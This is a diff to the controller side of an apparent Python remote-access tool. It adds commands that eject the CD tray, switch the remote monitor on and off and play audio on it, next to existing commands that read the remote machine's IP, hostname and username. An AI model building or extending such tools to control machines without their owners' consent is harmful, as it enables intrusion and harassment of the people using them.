@@ -104,7 +104,7 @@ def Server():
                             bufferst = os.stat(filename)
                             print("[+] File opened " + filename + " ("+str(bufferst.st_size) + " bytes)" )
                             SendBytes(data)
-                            print("[+] File Sent.")
+                            print("[+] Sending File..")
                     except FileNotFoundError:
                         print("[x] File not found!?")
                     except Exception as e:
@@ -150,12 +150,28 @@ def Server():
                     - wanip - Get Wan ip of remote machine.
                     - hostname - Get Hostname of Remote machine.
                     - username - Get Username of Remote Machine.
+                    - cdopen - Eject CD ROM.
+                    - cdclose - Close CD ROM.
+                    - monitoron - Turn monitor ON.
+                    - monitoroff - Turn monitor Off.
+                    - playaudio - Play Audio.
                     """)
+                elif(data == "cdopen"):
+                    SendData("cdopen")
+                elif(data == "cdclose"):
+                    SendData("cdclose")
+                elif(data == "monitoron"):
+                    SendData("monitoron")
+                elif(data == "monitoroff"):
+                    SendData("monitoroff")
+                elif(data == "playaudio"):
+                    audio = input("[+] Enter Filename (WAV) -> ")
+                    SendData("playaudio="+audio)
                 elif(data == "kill"):
                     print("[^] Killing Connection...")
                     SendData("kill")
+                    client.close()
                     server.close()
-                    time.sleep(1)
                     exit(True)
                 else:
                     print("[~] Unknown command.")
